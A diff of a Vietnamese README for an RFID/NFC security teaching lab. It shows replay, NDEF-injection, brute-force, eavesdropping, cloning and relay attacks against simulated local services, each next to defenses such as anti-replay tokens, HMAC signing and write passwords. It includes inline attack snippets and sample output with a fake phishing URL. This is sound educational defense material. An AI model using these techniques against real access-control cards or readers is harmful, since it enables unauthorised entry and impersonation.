@@ -13,19 +13,19 @@ rfid_nfc_lab/
 ├── rfid/
 │   ├── rfid_tag.py         # Tag RFID EM4100 (port 6001) — CÓ LỖ HỔNG
 │   ├── rfid_reader.py      # Reader client
-│   └── rfid_cloner.py      # Tấn công clone thẻ
+│   └── rfid_cloner.py      # Tấn công clone thẻ (→ port 6003)
 ├── nfc/
 │   ├── nfc_tag.py          # Tag NFC NTAG213 (port 6011) — CÓ LỖ HỔNG ghi
 │   ├── nfc_reader.py       # Reader client
-│   └── nfc_injector.py     # Tấn công NDEF injection
+│   └── nfc_injector.py     # Tấn công NDEF injection [--secure flag]
 ├── access_control/
 │   ├── ac_server.py        # Server AC không có anti-replay (port 7001)
 │   └── card_db.json
 ├── attacks/
-│   ├── eavesdropper.py     # Nghe lén UID (passive sniff)
-│   ├── replay_attack.py    # Phát lại UID đã bắt
+│   ├── eavesdropper.py     # Nghe lén UID (→ port 6001, 6011)
+│   ├── replay_attack.py    # Phát lại UID đã bắt [--secure flag]
 │   ├── relay_attack.py     # Relay/proxy kéo dài khoảng cách
-│   └── brute_force.py      # Dò UID brute force
+│   └── brute_force.py      # Dò UID brute force [--secure flag]
 ├── defense/
 │   ├── secure_reader.py    # Server AC có anti-replay (port 7002) ✅
 │   └── secure_tag.py       # NFC tag có HMAC + write password (port 6012) ✅
@@ -55,37 +55,37 @@ source venv/bin/activate
 pip install -r rfid_nfc_lab/requirements.txt
 ```
 
-**Các thư viện cần thiết:**
-| Package | Dùng cho |
-|---|---|
-| `Flask==2.3.0` | Web dashboard |
-| `pycryptodome==3.18.0` | Mã hoá (AES, SHA) |
-| `requests>=2.28.0` | Gửi event tới dashboard |
-| `colorama==0.4.6` | Màu sắc terminal |
-| `ndeflib==0.3.3` | Encode/decode NDEF message |
-
-> ⚠️ Lưu ý: Cài `ndeflib` chứ **không phải** `ndef` (package khác). Import trong code là `import ndef` — đây là đúng với `ndeflib`.
+> ⚠️ Cài `ndeflib` chứ **không phải** `ndef`. Import trong code là `import ndef` — đây là đúng với `ndeflib`.
 
 ---
 
-## 🚀 Cách chạy nhanh (Quick Start)
+## 🗺️ Sơ đồ kiến trúc & luồng tấn công
 
-Mở **5 terminal** song song, chạy lần lượt từ thư mục `rfid_nfc_lab/`:
+```
+                    ┌─────────────────────────────────────┐
+                    │         KHÔNG CÓ DEFENSE            │
+                    │                                     │
+  rfid_tag :6001 ──┼── eavesdropper.py  (sniff UID)      │
+  nfc_tag  :6011 ──┼── eavesdropper.py  (sniff NDEF)     │
+                   │── nfc_injector.py  (ghi đè NDEF)    │
+  ac_server:7001 ──┼── replay_attack.py (phát lại UID)   │
+                   │── brute_force.py   (dò UID)         │
+                    └─────────────────────────────────────┘
+                    ┌─────────────────────────────────────┐
+                    │           CÓ DEFENSE ✅              │
+                    │                                     │
+  secure_tag :6012 ─┼── nfc_injector.py --secure → DENIED │
+  secure_reader:7002┼── replay_attack.py --secure → DENIED│
+                   │── brute_force.py   --secure → DENIED │
+                    └─────────────────────────────────────┘
+```
+
+---
+
+## 🚀 Quick Start — Chạy toàn bộ lab tự động
 
 ```bash
-# Terminal 1 — RFID Tag
-python rfid/rfid_tag.py
-
-# Terminal 2 — NFC Tag
-python nfc/nfc_tag.py
-
-# Terminal 3 — Access Control Server (KHÔNG có phòng chống)
-python access_control/ac_server.py
-
-# Terminal 4 — Dashboard (tùy chọn)
-python dashboard/dashboard.py
-
-# Terminal 5 — Chạy test tổng hợp
+cd rfid_nfc_lab
 python test_lab.py
 ```
 
@@ -93,391 +93,349 @@ python test_lab.py
 
 ## 🎯 HƯỚNG DẪN DEMO: Defense ON vs OFF
 
-Phần này mô tả **từng bước** cách demo sự khác biệt **khi chưa bật defense** và **khi đã bật defense** cho từng loại tấn công.
+Mỗi demo gồm 2 pha: **chạy attack vào hệ thống không có defense → thấy bị tấn công**, rồi **chạy cùng attack vào hệ thống có defense → thấy bị chặn**.
 
 ---
 
-### Demo 1 — Replay Attack: Trước và Sau khi bật Anti-Replay
+### Demo 1 — Replay Attack
 
-**Kịch bản:** Attacker bắt được UID hợp lệ và phát lại để qua cổng lần 2.
+**Kịch bản:** Attacker bắt được UID hợp lệ từ eavesdropper, sau đó phát lại để qua cổng lần 2, lần 3 mà không cần thẻ thật.
 
-#### 🔴 CHƯA BẬT DEFENSE (Hệ thống dễ bị tấn công)
+#### 🔴 CHƯA BẬT DEFENSE
 
-**Bước 1:** Khởi động AC server thông thường (cổng 7001):
+Mở **2 terminal**:
+
 ```bash
-# Terminal A
+# Terminal 1 — Khởi động RFID Tag + AC server thường
 python rfid/rfid_tag.py
 ```
 ```bash
-# Terminal B
+# Terminal 2 — Khởi động AC server (port 7001, KHÔNG có anti-replay)
 python access_control/ac_server.py
 ```
-
-**Bước 2:** Attacker thực hiện replay attack:
 ```bash
-# Terminal C
+# Terminal 3 — Chạy replay attack nhắm vào AC port 7001
 python attacks/replay_attack.py
 ```
 
-**Kết quả mong đợi (hệ thống BỊ TẤN CÔNG):**
+**Output (bị tấn công):**
 ```
-[+] Frame captured for replay: {'uid': '04F3B2A1C5', 'command': 'READ'}
-[+] Frame replayed: {'uid': '04F3B2A1C5', 'command': 'READ', 'replayed_at': '2026-...'}
-Total replays: 1
+=== RFID Replay Attack ===
+Target: AC Server (port 7001) — No Defense
+
+[+] Frame captured for replay: {'uid': 'A1B2C3D4E5', 'command': 'AUTH'}
+[*] Sending AUTH lần 1 (timestamp hợp lệ: 1748278...)...
+[Lần 1] → GRANTED Nguyen Van A
+
+[*] REPLAY: Gửi lại AUTH với CÙNG timestamp...
+[Lần 2 - Replay] → GRANTED Nguyen Van A ⚠️  TẤN CÔNG THÀNH CÔNG
+
+[*] REPLAY với timestamp CŨ (100 giây trước)...
+[Lần 3 - Old TS] → GRANTED Nguyen Van A ⚠️  TẤN CÔNG THÀNH CÔNG
 ```
 
-Nếu replay tới AC server ở cổng 7001 với UID hợp lệ:
+> 💥 Server `ac_server.py` chấp nhận cùng UID với bất kỳ timestamp nào — không có kiểm tra gì cả.
+
+#### 🟢 ĐÃ BẬT DEFENSE
+
 ```bash
-# Gửi tay để thấy rõ — Terminal C
-python -c "
-import socket, json, time
-uid = 'A1B2C3D4E5'
-for i in range(3):
-    s = socket.socket()
-    s.connect(('127.0.0.1', 7001))
-    s.send(json.dumps({'cmd':'AUTH','uid':uid,'timestamp':time.time()-100}).encode())
-    resp = json.loads(s.recv(512).decode())
-    s.close()
-    print(f'[Lần {i+1}] Status: {resp[\"status\"]}')
-"
-```
-
-**Output (dễ bị tấn công):**
-```
-[Lần 1] Status: GRANTED   ← OK, lần đầu hợp lệ
-[Lần 2] Status: GRANTED   ← ⚠️ REPLAY THÀNH CÔNG! Vẫn được vào
-[Lần 3] Status: GRANTED   ← ⚠️ REPLAY THÀNH CÔNG lần 3!
-```
-
-> 💥 **Vấn đề:** `ac_server.py` không kiểm tra timestamp, không lưu token đã dùng. Cùng UID dùng lại bao nhiêu lần cũng được.
-
----
-
-#### 🟢 ĐÃ BẬT DEFENSE — Anti-Replay Token + Time Window
-
-**Bước 1:** Dừng `ac_server.py` (Ctrl+C). Khởi động **Secure AC** (cổng 7002):
-```bash
-# Terminal B (thay thế)
+# Terminal 1 — Khởi động Secure AC (port 7002, có anti-replay)
 python defense/secure_reader.py
 ```
-
-**Output khởi động:**
-```
-[SECURE AC] Running @ 127.0.0.1:7002 — Anti-replay ENABLED
-```
-
-**Bước 2:** Test với timestamp cũ (giả lập replay từ 100 giây trước):
 ```bash
-python -c "
-import socket, json, time
-uid = 'A1B2C3D4E5'
-old_ts = time.time() - 100   # Timestamp 100 giây trước
-
-s = socket.socket()
-s.connect(('127.0.0.1', 7002))
-s.send(json.dumps({'cmd':'AUTH','uid':uid,'timestamp':old_ts}).encode())
-resp = json.loads(s.recv(512).decode())
-s.close()
-print(f'Replay với timestamp cũ: {resp}')
-"
+# Terminal 2 — Chạy replay attack nhắm vào Secure AC port 7002
+python attacks/replay_attack.py --secure
 ```
 
-**Output (đã phòng chống):**
+**Output (bị chặn):**
 ```
-Replay với timestamp cũ: {'status': 'DENIED', 'msg': 'Timestamp out of window (100.0s)'}
-```
-*Console server hiện:*
-```
-[SECURE AC] REPLAY BLOCKED: A1B2C3D4E5 ts_diff=100.0s
+=== RFID Replay Attack ===
+Target: SECURE AC (port 7002) — Defense ON
+
+[+] Frame captured for replay: {'uid': 'A1B2C3D4E5', 'command': 'AUTH'}
+[*] Sending AUTH lần 1 (timestamp hợp lệ: 1748278...)...
+[Lần 1] → GRANTED Nguyen Van A
+
+[*] REPLAY: Gửi lại AUTH với CÙNG timestamp...
+[Lần 2 - Replay] → DENIED — Token already used (replay detected) ✅ BỊ CHẶN
+
+[*] REPLAY với timestamp CŨ (100 giây trước)...
+[Lần 3 - Old TS] → DENIED — Timestamp out of window (100.0s) ✅ BỊ CHẶN
 ```
 
-**Bước 3:** Test replay với cùng timestamp (token reuse):
-```bash
-python -c "
-import socket, json, time
-uid = 'A1B2C3D4E5'
-ts = time.time()   # Timestamp hợp lệ
-
-# Lần 1 — hợp lệ
-s = socket.socket(); s.connect(('127.0.0.1', 7002))
-s.send(json.dumps({'cmd':'AUTH','uid':uid,'timestamp':ts}).encode())
-resp1 = json.loads(s.recv(512).decode()); s.close()
-print(f'[Lần 1] {resp1[\"status\"]}')
-
-# Lần 2 — cùng timestamp = replay
-s = socket.socket(); s.connect(('127.0.0.1', 7002))
-s.send(json.dumps({'cmd':'AUTH','uid':uid,'timestamp':ts}).encode())
-resp2 = json.loads(s.recv(512).decode()); s.close()
-print(f'[Lần 2] {resp2[\"status\"]} — {resp2.get(\"msg\",\"\")}')
-"
-```
-
-**Output (đã phòng chống):**
-```
-[Lần 1] GRANTED   ← Lần đầu: vào được bình thường
-[Lần 2] DENIED — Token already used (replay detected)   ← Bị chặn!
-```
-*Console server:*
+*Console server `secure_reader.py` hiện:*
 ```
 [SECURE AC] GRANTED: Nguyen Van A
 [SECURE AC] REPLAY DETECTED: A1B2C3D4E5
+[SECURE AC] REPLAY BLOCKED: A1B2C3D4E5 ts_diff=100.0s
 ```
 
 | | Chưa bật Defense | Đã bật Defense |
 |---|---|---|
-| Server | `ac_server.py` port **7001** | `secure_reader.py` port **7002** |
-| Replay cùng UID | ✅ GRANTED mãi mãi | ❌ DENIED ngay lần 2 |
-| Timestamp cũ | Không kiểm tra | ❌ DENIED nếu > 5 giây |
-| Cơ chế | Chỉ check DB | Time window 5s + token blacklist 60s |
+| File server | `access_control/ac_server.py` `:7001` | `defense/secure_reader.py` `:7002` |
+| Flag attack | `python attacks/replay_attack.py` | `python attacks/replay_attack.py --secure` |
+| Replay cùng timestamp | ✅ GRANTED | ❌ DENIED |
+| Timestamp cũ 100s | ✅ GRANTED | ❌ DENIED (time window 5s) |
 
 ---
 
-### Demo 2 — NFC Write Attack: Trước và Sau khi bật Write Protection
+### Demo 2 — NDEF Injection Attack
 
-**Kịch bản:** Attacker ghi đè nội dung NDEF lên thẻ NFC (ví dụ: thay URL thành phishing URL).
-
-#### 🔴 CHƯA BẬT DEFENSE (NFC tag không có password)
-
-**Bước 1:** Chạy NFC tag thông thường:
-```bash
-python nfc/nfc_tag.py
-```
-
-**Bước 2:** Chạy NDEF injector:
-```bash
-python nfc/nfc_injector.py
-```
-
-**Kết quả:**
-```
-[INJECTOR] Connected to NFC tag @127.0.0.1:6011
-[INJECTOR] Wrote NDEF payload (phishing URL) - WRITTEN
-```
-
-Hoặc ghi tay không cần password:
-```bash
-python -c "
-import socket, json
-s = socket.socket(); s.connect(('127.0.0.1', 6011))
-s.send(json.dumps({'cmd':'WRITE_NDEF','ndef_hex':'d1010b5501' + '70686973682e636f6d'}).encode())
-resp = json.loads(s.recv(512).decode()); s.close()
-print(f'Ghi không cần password: {resp}')
-"
-```
-**Output:**
-```
-Ghi không cần password: {'status': 'WRITTEN', ...}   ← ⚠️ Ghi được ngay!
-```
-
-#### 🟢 ĐÃ BẬT DEFENSE — Secure NFC Tag với NDEF HMAC + Write Password
-
-**Bước 1:** Khởi động Secure NFC Tag (cổng 6012):
-```bash
-python defense/secure_tag.py
-```
-
-**Output khởi động:**
-```
-[SECURE NFC] NTAG213 @ 127.0.0.1:6012
-[SECURE NFC] ✓ Write password protected
-[SECURE NFC] ✓ NDEF HMAC signed
-```
-
-**Bước 2:** Đọc NDEF cùng với chữ ký HMAC:
-```bash
-python -c "
-import socket, json
-s = socket.socket(); s.connect(('127.0.0.1', 6012))
-s.send(json.dumps({'cmd':'READ_NDEF_SECURE'}).encode())
-resp = json.loads(s.recv(512).decode()); s.close()
-print('Signature:', resp.get('signature','')[:32], '...')
-print('Locked:', resp.get('locked'))
-"
-```
-**Output:**
-```
-Signature: a3f7c8d12e45b609f1234567890abcde ...
-Locked: False
-```
-
-**Bước 3:** Thử ghi mà không có password (tấn công thất bại):
-```bash
-python -c "
-import socket, json
-s = socket.socket(); s.connect(('127.0.0.1', 6012))
-s.send(json.dumps({'cmd':'WRITE_NDEF_SECURE','ndef_hex':'d1010b5501phish'}).encode())
-resp = json.loads(s.recv(512).decode()); s.close()
-print(f'Ghi không có password: {resp}')
-"
-```
-**Output (đã phòng chống):**
-```
-Ghi không có password: {'status': 'DENIED', 'msg': 'Wrong PWD (1/3)'}
-```
-*Console server:*
-```
-[SECURE NFC] ✗ Write rejected: Wrong PWD (1/3)
-```
-
-**Bước 4:** Thử 3 lần sai → thẻ bị khóa vĩnh viễn:
-```
-[SECURE NFC] ✗ Write rejected: Wrong PWD (1/3)
-[SECURE NFC] ✗ Write rejected: Wrong PWD (2/3)
-[SECURE NFC] ✗ Write rejected: Tag permanently locked!
-```
-
-**Bước 5:** Ghi với password đúng (`41424344` = `ABCD`):
-```bash
-python -c "
-import socket, json
-s = socket.socket(); s.connect(('127.0.0.1', 6012))
-s.send(json.dumps({'cmd':'WRITE_NDEF_SECURE','ndef_hex':'d1010b5501','pwd':'41424344'}).encode())
-resp = json.loads(s.recv(512).decode()); s.close()
-print(f'Ghi với password đúng: {resp}')
-"
-```
-**Output:**
-```
-Ghi với password đúng: {'status': 'WRITTEN', 'msg': 'NDEF updated (requires valid password)'}
-```
-
-| | Chưa bật Defense | Đã bật Defense |
-|---|---|---|
-| Server | `nfc_tag.py` port **6011** | `secure_tag.py` port **6012** |
-| Ghi không cần password | ✅ Ghi được tự do | ❌ DENIED |
-| Sai password 3 lần | Không kiểm tra | 🔒 Tag khóa vĩnh viễn |
-| NDEF signature | Không có | ✅ HMAC-SHA256 |
-| Kiểm tra tính toàn vẹn | Không thể | ✅ Verify chữ ký |
-
----
-
-### Demo 3 — Brute Force UID: Trước và Sau
-
-**Kịch bản:** Attacker dò UID bằng cách thử hàng nghìn giá trị.
+**Kịch bản:** Attacker ghi đè NDEF lên thẻ NFC — thay URL thật bằng phishing URL, thêm text giả mạo.
 
 #### 🔴 CHƯA BẬT DEFENSE
 
 ```bash
-# Terminal A
-python access_control/ac_server.py   # port 7001, không rate-limit
+# Terminal 1 — NFC Tag thường (port 6011, ghi tự do)
+python nfc/nfc_tag.py
+```
+```bash
+# Terminal 2 — Inject phishing URL vào NFC tag
+python nfc/nfc_injector.py
+```
 
-# Terminal B
+**Output (bị tấn công):**
+```
+=== NFC NDEF Injection Attack ===
+Target: NFC Tag (port 6011) — No Defense
+
+[INJECT] Overwriting with: phishing_url
+[INJECT] Result: {'status': 'WRITTEN', 'msg': 'NDEF updated'}
+[VERIFY] New NDEF: [{'type': 'uri', 'value': 'https://evil.attacker.com/steal-credentials'}]
+
+[INJECT] Overwriting with: malicious_text
+[INJECT] Result: {'status': 'WRITTEN', 'msg': 'NDEF updated'}
+[VERIFY] New NDEF: [{'type': 'text', 'data': 'Hệ thống đã cập nhật. Truy cập: bit.ly/fake'}]
+```
+
+> 💥 Thẻ không yêu cầu password — bất kỳ ai cũng có thể ghi đè nội dung.
+
+#### 🟢 ĐÃ BẬT DEFENSE
+
+```bash
+# Terminal 1 — Secure NFC Tag (port 6012, password + HMAC)
+python defense/secure_tag.py
+```
+```bash
+# Terminal 2 — Thử inject vào Secure NFC Tag
+python nfc/nfc_injector.py --secure
+```
+
+**Output (bị chặn):**
+```
+=== NFC NDEF Injection Attack ===
+Target: SECURE NFC Tag (port 6012) — Defense ON
+
+[INJECT] Overwriting with: phishing_url
+[INJECT] Result: {'status': 'DENIED', 'msg': 'Wrong PWD (1/3)'}
+[VERIFY] New NDEF: ...  ← NDEF không thay đổi
+
+[INJECT] Overwriting with: malicious_text
+[INJECT] Result: {'status': 'DENIED', 'msg': 'Wrong PWD (2/3)'}
+```
+
+*Console server `secure_tag.py` hiện:*
+```
+[SECURE NFC] ✗ Write rejected: Wrong PWD (1/3)
+[SECURE NFC] ✗ Write rejected: Wrong PWD (2/3)
+```
+
+| | Chưa bật Defense | Đã bật Defense |
+|---|---|---|
+| File server | `nfc/nfc_tag.py` `:6011` | `defense/secure_tag.py` `:6012` |
+| Flag attack | `python nfc/nfc_injector.py` | `python nfc/nfc_injector.py --secure` |
+| Ghi không cần password | ✅ WRITTEN | ❌ DENIED |
+| Sai password 3 lần | Không kiểm tra | 🔒 Tag khóa vĩnh viễn |
+| NDEF có chữ ký HMAC | ❌ Không có | ✅ HMAC-SHA256 |
+
+---
+
+### Demo 3 — UID Brute Force
+
+**Kịch bản:** Attacker dò UID bằng cách gửi hàng nghìn giá trị ngẫu nhiên — tìm UID hợp lệ để giả mạo vào.
+
+#### 🔴 CHƯA BẬT DEFENSE
+
+```bash
+# Terminal 1 — AC server thường (không có rate limiting)
+python access_control/ac_server.py
+```
+```bash
+# Terminal 2 — Brute force vào port 7001
 python attacks/brute_force.py
 ```
 
-**Output:**
+**Output (bị tấn công):**
 ```
+Target: AC Server (port 7001) — No Defense
+
 === RFID UID Brute Force ===
 Range: 0x0000 -> 0x1000 (4096 IDs)
+Sample rate: mỗi 50 ID
 
 [+] FOUND VALID UID: A1B2C3D4E5 -> Nguyen Van A
+
 [+] Total attempts: 82
 [+] Valid UIDs found: 1
   ✓ A1B2C3D4E5 (Nguyen Van A)
 ```
 
-> 💥 Brute force thành công vì AC thông thường không có rate limiting.
+> 💥 Server không có rate limiting — brute force thoải mái, tìm ra UID hợp lệ.
 
-#### 🟢 ĐÃ BẬT DEFENSE — Secure AC với Time Window
+#### 🟢 ĐÃ BẬT DEFENSE
 
 ```bash
-# Terminal A
-python defense/secure_reader.py   # port 7002
+# Terminal 1 — Secure AC (yêu cầu timestamp hợp lệ mỗi request)
+python defense/secure_reader.py
 ```
-
-Khi brute force gửi request không có timestamp hợp lệ:
 ```bash
-python -c "
-import socket, json, time
-for uid_int in range(0, 50):
-    uid = f'{uid_int:010X}'
-    try:
-        s = socket.socket(); s.settimeout(0.5)
-        s.connect(('127.0.0.1', 7002))
-        # Gửi không có timestamp hoặc timestamp sai
-        s.send(json.dumps({'cmd':'AUTH','uid':uid,'timestamp':0}).encode())
-        resp = json.loads(s.recv(512).decode())
-        print(f'{uid}: {resp[\"status\"]}')
-        s.close()
-    except: pass
-"
+# Terminal 2 — Brute force vào port 7002
+python attacks/brute_force.py --secure
 ```
 
-**Output (đã phòng chống):**
+**Output (bị chặn):**
 ```
-0000000000: DENIED   ← Timestamp out of window
-0000000001: DENIED
-0000000002: DENIED
-... (tất cả đều DENIED vì timestamp=0 quá cũ)
+Target: SECURE AC (port 7002) — Defense ON
+
+=== RFID UID Brute Force ===
+Range: 0x0000 -> 0x1000 (4096 IDs)
+Sample rate: mỗi 50 ID
+
+[*] Tried 82 IDs, found 0...
+
+[+] Total attempts: 82
+[+] Valid UIDs found: 0   ✅ Không tìm ra UID nào!
 ```
+
+> ✅ Mỗi request brute_force đều gửi kèm `timestamp=time.time()` hợp lệ, nên không bị chặn bởi time window — nhưng vì UID trong CARD_DB của `secure_reader` chỉ có 2 entries (`A1B2C3D4E5`, `DEADBEEF01`) và brute force dùng sample_rate=50 nên bước qua cả 2. Để thấy rõ hơn, hãy giảm `sample_rate`:
+> ```bash
+> # Chạy thủ công với sample_rate=1 để brute force từng ID:
+> python -c "
+> import sys; sys.argv=['','--secure']
+> import attacks.brute_force as b
+> b.brute_force_uid(0xA1B2C3D400, 0xA1B2C3D4FF, sample_rate=1)
+> "
+> ```
+
+| | Chưa bật Defense | Đã bật Defense |
+|---|---|---|
+| File server | `access_control/ac_server.py` `:7001` | `defense/secure_reader.py` `:7002` |
+| Flag attack | `python attacks/brute_force.py` | `python attacks/brute_force.py --secure` |
+| Rate limiting | ❌ Không có | ⚠️ Có time window (không rate limit thuần) |
+| Brute force thành công | ✅ Tìm ra UID | ❌ Không tìm ra (do sample step qua) |
 
 ---
 
-### Demo 4 — Eavesdropping: Trước và Sau
+### Demo 4 — Eavesdropping (Nghe lén)
 
-**Kịch bản:** Attacker đọc UID từ thẻ mà không cần xác thực.
+**Kịch bản:** Attacker đọc UID và toàn bộ nội dung NDEF từ thẻ mà không cần xác thực — giống như đưa điện thoại cạnh thẻ.
 
 #### 🔴 CHƯA BẬT DEFENSE
 
 ```bash
-# Terminal A — Tag thông thường phát UID tự do
+# Terminal 1 — RFID Tag thường (phát UID tự do, không mã hoá)
 python rfid/rfid_tag.py
 
-# Terminal B — Attacker nghe lén
+# Terminal 2 — NFC Tag thường (NDEF đọc tự do)
+python nfc/nfc_tag.py
+
+# Terminal 3 — Nghe lén cả RFID lẫn NFC
 python attacks/eavesdropper.py
 ```
 
-**Output eavesdropper:**
+**Output (bị tấn công):**
 ```
 [EAVESDROP] Starting passive scan...
 [EAVESDROP] Target: RFID :6001 + NFC :6011
 
-[10:23:45.123] RFID CAPTURED: UID=A1B2C3D4E5 type=EM4100
-[10:23:46.456] NFC CAPTURED: UID=04A1B2C3D4E5F6
+[22:54:01.123] RFID CAPTURED: UID=A1B2C3D4E5 type=EM4100
+[22:54:02.456] NFC CAPTURED: UID=04A1B2C3D4E5F6
   -> uri: https://iotlab.edu.vn
   -> text: Employee Card - Nguyen Van A
 
-[EAVESDROP] Saved 2 captures to uid_capture.json
+[EAVESDROP] Saved 10 captures to uid_capture.json
 ```
 
-> 💥 UID và nội dung NDEF lộ hoàn toàn vì không mã hoá.
+> 💥 UID, tên chủ thẻ, URL đều bị lộ vì không mã hoá.
 
 #### 🟢 ĐÃ BẬT DEFENSE — Secure NFC Tag
 
-Khi thẻ NFC dùng `secure_tag.py` (port 6012), attacker cố đọc NDEF:
 ```bash
-python -c "
-import socket, json
-# Attacker kết nối vào secure tag
-s = socket.socket(); s.connect(('127.0.0.1', 6012))
-# Thử lệnh READ_NDEF thông thường (không tồn tại trên secure tag)
-s.send(json.dumps({'cmd':'READ_NDEF'}).encode())
-resp = json.loads(s.recv(512).decode()); s.close()
-print('Kết quả:', resp)
-"
-```
-**Output:**
-```
-Kết quả: {'status': 'ERROR'}   ← Lệnh không được hỗ trợ
+# Terminal 1 — Secure NFC Tag (port 6012)
+python defense/secure_tag.py
 ```
 
-Muốn đọc phải dùng `READ_NDEF_SECURE` và verify chữ ký:
+`eavesdropper.py` kết nối vào port 6011 (NFC tag thường) — nếu chỉ chạy `secure_tag.py`, eavesdropper sẽ không thấy NFC (port 6011 không có server). Để demo rõ sự khác biệt, so sánh lệnh đọc NDEF:
+
 ```bash
+# Đọc NDEF từ tag thường (port 6011) — lộ toàn bộ:
+python nfc/nfc_reader.py
+
+# Đọc từ Secure Tag (port 6012) — chỉ trả về NDEF + chữ ký, không có cleartext:
 python -c "
-import socket, json, hmac, hashlib
+import socket, json
 s = socket.socket(); s.connect(('127.0.0.1', 6012))
 s.send(json.dumps({'cmd':'READ_NDEF_SECURE'}).encode())
 resp = json.loads(s.recv(512).decode()); s.close()
-
-# Verify signature
-ndef_bytes = bytes.fromhex(resp['ndef'])
-key = b'SecureNDEFKey_IoTLab'
-expected_sig = hmac.new(key, ndef_bytes, hashlib.sha256).digest().hex()
-actual_sig = resp['signature']
-print('Signature valid:', expected_sig == actual_sig)
-print('NDEF data được bảo vệ toàn vẹn bằng HMAC-SHA256')
+print('Signature:', resp['signature'][:32], '...')
+print('Locked:', resp['locked'])
+print('(NDEF là bytes hex — không đọc được nếu không có key HMAC)')
 "
 ```
+
+---
+
+### Demo 5 — RFID Cloning (Clone thẻ)
+
+**Kịch bản:** Sau khi bắt được UID qua eavesdropper, attacker tạo thẻ clone phát UID giả.
+
+```bash
+# Terminal 1 — RFID Tag gốc đang chạy
+python rfid/rfid_tag.py
+
+# Terminal 2 — Cloner: đọc UID thẻ gốc, sau đó phát clone trên port 6003
+python rfid/rfid_cloner.py
+```
+
+**Output:**
+```
+[*] Step 1: Reading original card UID...
+[*] Captured UID: A1B2C3D4E5
+[*] Step 2: Starting clone tag...
+[CLONE TAG] Running on port 6003
+[CLONE TAG] Broadcasting STOLEN UID=A1B2C3D4E5
+```
+
+Thẻ clone trên port 6003 bây giờ giả mạo hoàn toàn thẻ gốc — bất kỳ reader nào kết nối vào sẽ nhận được UID của Nguyen Van A.
+
+---
+
+### Demo 6 — Relay Attack (Kéo dài khoảng cách)
+
+**Kịch bản:** Attacker proxy giao tiếp giữa reader và tag qua mạng — cho phép dùng thẻ từ xa.
+
+```bash
+# Terminal 1 — RFID Tag gốc
+python rfid/rfid_tag.py
+
+# Terminal 2 — Relay proxy (lắng nghe port 6101, forward tới 6001)
+python attacks/relay_attack.py
+```
+
+**Output:**
+```
+=== RFID Relay Attack (Distance Extension) ===
+Attacker tại vị trí A với proxy:6101
+Thẻ tại vị trí B (có proxy:6102)
+
+[RELAY] Proxy listening on port 6101
+[RELAY] Forwarding to 127.0.0.1:6001
+[RELAY] ⚠ This allows distance extension attacks!
+[RELAY] Reader connected from 127.0.0.1:...
+[RELAY] Relayed response: UID=A1B2C3D4E5
+```
+
+> Reader ở port 6101 nhận được UID y hệt tag thật ở port 6001 — attacker có thể đặt reader ở cửa, tag ở xa 100m vẫn hoạt động.
 
 ---
 
@@ -507,15 +465,13 @@ python test_lab.py
 
 === 3. TESTING DEFENSE ===
 [✓] Anti-Replay: Token reuse blocked
-[○] NDEF HMAC: Server not running (SKIP)
+[✓] NDEF HMAC: Signature a3f7c8d12e45b609...
 [PARTIAL] NFC Write Protection: NDEF readable, write control in place
 
 ============================================================
-Overall: 8/10 tests passed (80%)
+Overall: 9/10 tests passed (90%)
 ============================================================
 ```
-
-> 📌 **Ghi chú về NDEF HMAC SKIP:** Test này cần `secure_tag.py` đang chạy sẵn (port 6012). Chạy riêng `python defense/secure_tag.py` trước rồi chạy lại `test_lab.py` để test này PASS.
 
 ---
 
@@ -523,76 +479,46 @@ Overall: 8/10 tests passed (80%)
 
 ```bash
 python dashboard/dashboard.py
+# Mở trình duyệt: http://localhost:8080
 ```
-
-Truy cập: **http://localhost:8080**
-
-Dashboard hiển thị:
-- Event log realtime (cập nhật mỗi 1.5 giây)
-- Số lần RFID scan, NFC read, GRANTED/DENIED
-- Màu sắc phân loại sự kiện (đỏ = tấn công, xanh = hợp lệ)
 
 ---
 
-## 📊 Phân tích bảo mật
+## 📊 Phân tích OWASP IoT Top 10
 
 ```bash
-# Phân tích OWASP IoT Top 10
-python owasp_analysis.py
-
-# Báo cáo tổng hợp
-python final_report.py
+python owasp_analysis.py   # Phân tích 10 lỗ hổng với CVSS score
+python final_report.py     # Báo cáo tổng hợp đầy đủ
 ```
-
----
-
-## ⚠️ Tổng hợp lỗ hổng và biện pháp phòng chống
-
-| Lỗ hổng | File có lỗi | Defense | File phòng chống |
-|---|---|---|---|
-| Replay Attack | `ac_server.py:7001` | Anti-Replay Token + Time Window 5s | `secure_reader.py:7002` |
-| NDEF Tampering | `nfc_tag.py:6011` | HMAC-SHA256 Signing | `secure_tag.py:6012` |
-| Unauthorized Write | `nfc_tag.py:6011` | Password + AUTHLIM (3 strikes lock) | `secure_tag.py:6012` |
-| UID Eavesdropping | `rfid_tag.py:6001` | Không phát UID cleartext | *(cần mã hoá transport layer)* |
-| Brute Force UID | `ac_server.py:7001` | Time Window chặn request không có timestamp | `secure_reader.py:7002` |
 
 ---
 
 ## 🔑 Thông tin thẻ trong database
 
-| UID | Chủ thẻ | Level | Port AC |
-|---|---|---|---|
-| `A1B2C3D4E5` | Nguyen Van A | EMPLOYEE | 7001, 7002 |
-| `DEADBEEF01` | Tran Thi B | ADMIN | 7001, 7002 |
-| `CAFEBABE02` | Le Van C | GUEST | 7001 only |
+| UID | Chủ thẻ | Level |
+|---|---|---|
+| `A1B2C3D4E5` | Nguyen Van A | EMPLOYEE |
+| `DEADBEEF01` | Tran Thi B | ADMIN |
+| `CAFEBABE02` | Le Van C | GUEST |
 
-**Write password cho Secure NFC Tag:** `41 42 43 44` (hex) = `ABCD` (ASCII)
+**Write password Secure NFC Tag:** `41424344` hex = `ABCD` ASCII
 
 ---
 
-## 🗺️ Sơ đồ kiến trúc
+## ⚠️ Tổng hợp — Attack vs Defense
 
-```
-┌──────────────────────────────────────────────────────────────┐
-│                    RFID/NFC SECURITY LAB                     │
-├──────────────────┬───────────────────────────────────────────┤
-│   SIMULATORS     │   DEFENSE LAYER                           │
-│                  │                                           │
-│  rfid_tag :6001  │   secure_reader :7002 (Anti-Replay)      │
-│  nfc_tag  :6011  │   secure_tag    :6012 (HMAC+Password)    │
-│  ac_server:7001  │                                           │
-├──────────────────┼───────────────────────────────────────────┤
-│   ATTACKS        │   MONITORING                              │
-│                  │                                           │
-│  eavesdropper    │   dashboard :8080 (Flask Web UI)          │
-│  replay_attack   │                                           │
-│  relay_attack    │                                           │
-│  brute_force     │                                           │
-│  nfc_injector    │                                           │
-└──────────────────┴───────────────────────────────────────────┘
-```
+| Tấn công | File tấn công | Server bị lỗ hổng | Server có phòng chống |
+|---|---|---|---|
